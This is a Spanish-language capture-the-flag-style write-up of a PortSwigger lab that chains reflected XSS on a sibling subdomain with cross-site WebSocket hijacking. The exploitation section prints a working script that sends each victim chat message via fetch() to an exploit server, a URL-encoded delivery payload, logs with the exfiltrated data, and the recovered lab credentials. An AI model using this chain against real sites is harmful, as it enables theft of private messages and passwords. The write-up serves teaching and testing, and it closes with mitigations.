---
title: "SameSite Strict bypass via sibling domain"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "samesite-strict-bypass-via-sibling-domain"
author: "Z4k7"
date: "2026-04-05"
year: "2026"
status: "pwned"
tags:
  - "WebSocket"
  - "Hijacking"
  - "CSWSH"
techniques:
  - "WebSocket Hijacking"
  - "CSWSH"
  - "XSS via Parameter Injection"
  - "Base64 Exfiltration"
tools:
  - "BurpSuite"
  - "Exploit Server"
  - "WebSocket Client"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque de secuestro de WebSocket entre sitios (Cross-Site WebSocket Hijacking - CSWSH). La aplicación mantiene un chat en vivo vía WebSocket sin validación de origen. El atacante crea un payload JavaScript que abre una conexión WebSocket desde contexto cross-site, escucha todos los mensajes (incluyendo mensajes privados del agente de soporte con credenciales), y exfiltra los datos codificados en Base64 hacia servidor atacante. Demuestra por qué WebSocket requiere validación de origen tan estricta como CORS.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La función de chat en vivo de este laboratorio es vulnerable al secuestro de WebSocket entre sitios (CSWSH). Para resolver el laboratorio, realiza un ataque CSWSH que extraiga el historial de chat de la víctima hacia tu servidor de explotación. El historial de chat contiene las credenciales de inicio de sesión en texto plano.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se accede al laboratorio y se identifica una tienda online con función de chat en vivo implementada mediante WebSockets.
          Los mensajes de chat enviados son vistos en tiempo real por un agente de soporte.
          Hallazgos iniciales:
      - kind: "bullet"
        text: "Chat disponible en la interfaz principal"
      - kind: "bullet"
        text: "Comunicación bidireccional vía WebSocket"
      - kind: "bullet"
        text: "Estructura aparente: JSON con campo 'message'"
      - kind: "bullet"
        text: "Sin validación visible de caracteres especiales o HTML"
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409134427034.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409134447694.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Concepto de validación:
          Se envía un mensaje de prueba para ver la respuesta en tiempo real:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409134518544.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos el comportamiento al momento de enviar un mensaje en el chat:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409134732176.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Chat WebSocket funcional y accesible"
      - kind: "bullet"
        text: "Sin validación de origen detectada"
      - kind: "bullet"
        text: "Acepta conexiones desde cualquier fuente"
      - kind: "bullet"
        text: "No hay autenticación WebSocket adicional"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "WebSocket es HTTP mejorado. Pero muchos desarrolladores olvidan que WebSocket TAMBIÉN necesita validación de origen. Si WebSocket no valida que el cliente viene del mismo dominio, es vulnerable a CSWSH — exactamente como CSRF, pero para WebSocket."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Se crea un payload JavaScript que:
          1. Abre una conexión WebSocket con el servidor vulnerable
          2. Escucha todos los mensajes recibidos
          3. Exfiltra cada mensaje hacia el servidor atacante
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          var ws = new WebSocket('wss://0a29001103d18cbf838123a500f20065.web-security-academy.net/chat');
          
          ws.onopen = function() {
              ws.send("READY");
          };
          
          ws.onmessage = function(event) {
              fetch("https://exploit-0abd004b03f78c5683a822e901010090.exploit-server.net/exploit?mensaje="+btoa(event.data))
          };
          </script>
      - kind: "note"
        text: |
          Se envía el siguiente código para validar si es posible la extracción de información del chat del usuario:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409135219883.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validación de datos exfiltrados:
          El servidor de exploits registra cada request con los datos Base64:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409135252871.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "JS"
        code: |
          10.0.4.18       2026-04-09 18:51:58 +0000 "GET /exploit/ HTTP/1.1" 200
          10.0.4.18       2026-04-09 18:51:58 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200
      - kind: "note"
        text: |
          Se decodifican los mensajes Base64:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409142114235.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Mensajes decodificados:
      - kind: "code"
        lang: "JSON"
        code: |
          {"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
      - kind: "callout"
        type: "warning"
        label: "WebSocket Sin Validación de Origen"
        text: "El servidor WebSocket acepta conexiones desde CUALQUIER origen. No hay validación de header `Origin`. No hay validación de `Host`. El cliente puede ser desde otro dominio completamente. Esto permite CSWSH."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "WebSocket comienza como HTTP handshake. Si el servidor no valida `Origin` en ese handshake, cualquiera puede conectar. Una vez conectado, recibe TODOS los mensajes de todos los usuarios — información privada incluida."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validando el código referente a JavaScript para WebSocket:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409142901896.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El directorio mencionado cuenta con un login:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409142934853.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos si es posible aplicar un XSS en el login:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409143106361.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se consulta que si es posible ingresar código arbitrario en la web. En este caso enviamos el código para validar si es posible extraer el historial:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409143437756.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El servidor confía en solicitudes provenientes de su propio dominio (o subdominios). Esto permite inyectar XSS en parámetros que se reflejan en el login.
          Payload con XSS + WebSocket Hijacking:
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          var ws = new WebSocket('wss://0a29001103d18cbf838123a500f20065.web-security-academy.net/chat');
          
          ws.onopen = function() {
              ws.send("READY");
          };
          
          ws.onmessage = function(event) {
              fetch("https://exploit-0abd004b03f78c5683a822e901010090.exploit-server.net/exploit?mensaje="+btoa(event.data))
          };
          </script>
      - kind: "note"
        text: |
          Aplicamos encode en URL:
      - kind: "code"
        lang: "URL"
        code: |
          %0a%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%36%30%30%37%37%30%33%38%37%32%30%30%30%38%32%37%39%36%62%61%30%30%30%65%34%30%30%33%39%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%0a%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%09%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%09%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%65%38%30%30%33%64%30%33%65%39%32%30%66%64%38%32%61%62%36%61%63%39%30%31%64%31%30%30%39%35%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%6e%73%61%6a%65%3d%22%2b%62%74%6f%61%28%65%76%65%6e%74%2e%64%61%74%61%29%29%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%0a%0a
      - kind: "note"
        text: |
          En este caso enviamos el código para validar la aceptación por parte del servidor:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409144251352.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ataque final — Redireccionamiento a parámetro XSS:
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          document.location = "http://cms-0ac600770387200082796ba000e40039.web-security-academy.net/login?username=%0a%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%63%36%30%30%37%37%30%33%38%37%32%30%30%30%38%32%37%39%36%62%61%30%30%30%65%34%30%30%33%39%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%0a%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%09%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%09%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%65%38%30%30%33%64%30%33%65%39%32%30%66%64%38%32%61%62%36%61%63%39%30%31%64%31%30%30%39%35%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%6e%73%61%6a%65%3d%22%2b%62%74%6f%61%28%65%76%65%6e%74%2e%64%61%74%61%29%29%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%0a%0a&password=aaaa"
          </script>
      - kind: "note"
        text: |
          El navegador envía la cookie porque la petición se origina desde el mismo dominio (o un dominio considerado same-site). Esto permite que el servidor procese la solicitud como legítima, aunque el contenido haya sido inyectado.
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409144658800.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez enviada la información a la víctima validamos los log para confirmar si nos envía el contenido:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409144755461.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "JS"
        code: |
          10.0.3.32       2026-04-09 19:46:39 +0000 "GET /exploit/ HTTP/1.1" 200
          10.0.3.32       2026-04-09 19:46:39 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200
          10.0.3.32       2026-04-09 19:46:39 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200
          10.0.3.32       2026-04-09 19:46:39 +0000 "GET /exploit?mensaje=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgcXZ4NXAzMjBtNG04ZjYxeWxmOHAifQ== HTTP/1.1" 200
      - kind: "note"
        text: |
          Se decodifican los mensajes Base64:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409144943911.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "JSON"
        code: |
          {"user":"Hal Pline","content":"Hello, how can I help?"} 
          {"user":"You","content":"I forgot my password"} 
          {"user":"Hal Pline","content":"No problem carlos, it's qvx5p320m4m8f61ylf8p"} 
          {"user":"You","content":"Thanks, I hope this doesn't come back to bite me!"} 
          {"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
      - kind: "note"
        text: |
          Lo anterior nos proporciona las credenciales del usuario:
      - kind: "bullet"
        text: "Usuario: carlos"
      - kind: "bullet"
        text: "Contraseña: qvx5p320m4m8f61ylf8p"
      - kind: "note"
        text: |
          Ingresamos las credenciales y estado OK:
      - kind: "image"
        src: "assets/images/SameSite%20Strict%20bypass%20via%20sibling%20domain/file-20260409150432086.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Anatomía del Ataque — WebSocket Hijacking + XSS"
        text: "1. Atacante inyecta XSS en parámetro de login 2. Parámetro refleja código JavaScript 3. JavaScript abre conexión WebSocket 4. WebSocket acepta conexiones desde CUALQUIER origen 5. Cliente recibe todos los mensajes del chat 6. Incluyendo mensajes privados (contraseñas) 7. Cada mensaje se codifica en Base64 y se exfiltra 8. Servidor atacante recibe datos 9. Se decodifican y se extraen credenciales 10. Acceso a cuenta comprometida ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este ataque es poderoso porque combina DOS vulnerabilidades: 1. XSS en parámetro (refleja código sin validación) 2. WebSocket sin validación de origen  El servidor confía en WebSocket porque 'es del mismo dominio' (ya que vino vía XSS). Pero XSS puede ser desde atacante cross-site. Por lo tanto, WebSocket recibe mensajes que nunca debería recibir."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El acceso inicial se logra a través de las credenciales extraídas:
      - kind: "bullet"
        text: "Usuario: carlos"
      - kind: "bullet"
        text: "Contraseña: qvx5p320m4m8f61ylf8p"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab cierra un ciclo importante: la mayoría de desarrolladores piensa en CSRF para formularios HTML, pero olvida que WebSocket TAMBIÉN necesita protección. Sin validación de origen WebSocket, cualquiera puede conectar desde cualquier sitio."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab logra escalada indirecta:
      - kind: "bullet"
        text: "Acceso como usuario carlos (credenciales extraídas)"
      - kind: "bullet"
        text: "Potencial acceso a funcionalidades adicionales con esas credenciales"

lessons:
  - 'WebSocket requiere validación de origen: Tan importante como CORS en HTTP.'
  - 'XSS + WebSocket = crítico: XSS sin protección WebSocket es desastre.'
  - 'No hay separación de datos por usuario en WebSocket: Todos reciben todos los mensajes.'
  - 'Base64 no es encriptación: Solo ofusca, no protege.'
  - 'Credenciales en chat privado = exposición total: Mensajes sensibles deben estar cifrados end-to-end.'
  - 'Validar Origin header es crítico: En WebSocket handshake.'
mitigation:
  - 'Validar `Origin` header en WebSocket handshake: Rechazar si no es del sitio esperado.'
  - 'Implementar autenticación en WebSocket: Tokens, no solo sesión.'
  - 'Usar WSS (WebSocket Secure): Siempre HTTPS, nunca WS.'
  - 'Encriptar datos sensibles: End-to-end, no solo en tránsito.'
  - 'Sanitizar parámetros: Prevenir XSS que abre conexiones WebSocket.'
  - 'Separar chats por usuario: No broadcast a todos.'
  - 'Rate limiting en WebSocket: Prevenir exfiltración masiva.'
---
